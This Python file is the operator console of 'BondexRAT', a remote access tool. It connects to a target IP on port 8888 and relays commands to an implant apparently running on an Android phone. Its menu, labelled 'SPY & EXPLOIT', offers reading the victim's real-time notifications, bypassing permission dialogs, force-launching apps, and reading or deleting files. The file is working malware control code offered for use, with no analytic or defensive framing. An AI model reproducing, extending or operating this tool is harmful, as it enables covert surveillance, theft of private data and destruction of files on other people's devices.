import socket
import sys
import os
import subprocess
import time

# BondexRAT - Advanced Remote Access Tool
# Auto-dependency installer
def install_dependencies():
    # Example: if we needed 'colorama' for better colors
    required = []
    for pkg in required:
        try:
            __import__(pkg)
        except ImportError:
            print(f"\033[93m[*] Dependency '{pkg}' missing. Installing...\033[0m")
            subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])

def send_command(ip, port, cmd):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(12)
            s.connect((ip, port))
            s.sendall((cmd + "\n").encode())

            data = b""
            while True:
                try:
                    part = s.recv(8192)
                    if not part: break
                    data += part
                    if len(part) < 8192: break
                except socket.timeout:
                    break
            return data.decode(errors='ignore').strip()
    except Exception as e:
        return f"Error: {e}"

def print_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    banner = """
\033[91m
 ██████╗  ██████╗ ███╗   ██╗██████╗ ███████╗██╗  ██╗██████╗  █████╗ ████████╗
 ██╔══██╗██╔═══██╗████╗  ██║██╔══██╗██╔════╝╚██╗██╔╝██╔══██╗██╔══██╗╚══██╔══╝
 ██████╔╝██║   ██║██╔██╗ ██║██║  ██║█████╗   ╚███╔╝ ██████╔╝███████║   ██║
 ██╔══██╗██║   ██║██║╚██╗██║██║  ██║██╔══╝   ██╔██╗ ██╔══██╗██╔══██║   ██║
 ██████╔╝╚██████╔╝██║ ╚████║██████╔╝███████╗██╔╝ ██╗██║  ██║██║  ██║   ██║
 ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝
\033[0m
\033[92m  [+] Version: 2.0 (Stable) | Developed by: Bondex Team [+]
  [+] Capabilities: File System, Accessibility, App Control [+]
\033[0m
    """
    print(banner)

def main():
    install_dependencies()

    if len(sys.argv) < 2:
        target_ip = input("\033[92m[?]\033[0m Target IP: ")
    else:
        target_ip = sys.argv[1]

    print_banner()
    current_dir = send_command(target_ip, 8888, "pwd")

    while True:
        try:
            if not current_dir or "Error" in str(current_dir):
                print(f"\033[91m[!] Connection Lost to {target_ip}\033[0m")
                target_ip = input("\033[92m[?]\033[0m New Target IP (or 'exit'): ")
                if target_ip.lower() == "exit": break
                current_dir = send_command(target_ip, 8888, "pwd")
                print_banner()
                continue

            prompt = f"\033[91mbondex\033[0m@\033[92m{target_ip}\033[0m:\033[94m{current_dir}\033[0m$ "
            cmd_input = input(prompt).strip()

            if not cmd_input:
                continue

            cmd_lower = cmd_input.lower()

            if cmd_lower == "help":
                print("""
    \033[1mSYSTEM COMMANDS\033[0m
    ---------------
    lock / unlock    : Toggle FPS Locker Overlay
    vibrate          : Pulse device vibrator
    home / back      : Hardware button simulation
    info             : Hardware & OS details
    screen           : Get current foreground app
    message <text>   : Show Toast notification
    clear            : Clear console screen
    exit             : Close connection

    \033[1mFILE SYSTEM\033[0m
    -----------
    ls               : List directory (Dirs first)
    cd <path>        : Change directory
    pwd              : Show current path
    cat <file>       : Read file contents
    rm <file>        : Delete file/folder

    \033[1mSPY & EXPLOIT\033[0m
    -------------
    notifs           : Read real-time notification logs
    apps             : List all installed user apps
    launch <pkg>     : Force open an application
    perm <on/off>    : Toggle Auto-Allow Permissions (Bypass dialogs)
                """)
            elif cmd_lower == "clear":
                print_banner()
            elif cmd_lower == "exit":
                print("\033[93m[*] Closing BondexRAT session...\033[0m")
                break
            elif cmd_lower.startswith("cd "):
                res = send_command(target_ip, 8888, cmd_input)
                if "ERROR" in res:
                    print(f"\033[91m{res}\033[0m")
                current_dir = send_command(target_ip, 8888, "pwd")
            elif cmd_lower == "notifs":
                print("\033[93m[*] Fetching latest notifications...\033[0m")
                res = send_command(target_ip, 8888, "notifs")
                print(f"\033[96m{res}\033[0m")
            elif cmd_lower == "apps":
                print("\033[93m[*] Listing installed applications...\033[0m")
                res = send_command(target_ip, 8888, "apps")
                print(res)
            elif cmd_lower.startswith("launch "):
                res = send_command(target_ip, 8888, cmd_input)
                print(f"\033[92m{res}\033[0m")
            else:
                res = send_command(target_ip, 8888, cmd_input)
                if res:
                    print(res)

        except KeyboardInterrupt:
            print("\n\033[93m[*] Session interrupted. Logging out...\033[0m")
            break
        except Exception as e:
            print(f"\033[91m[!] Fatal Error: {e}\033[0m")
            break

if __name__ == "__main__":
    main()
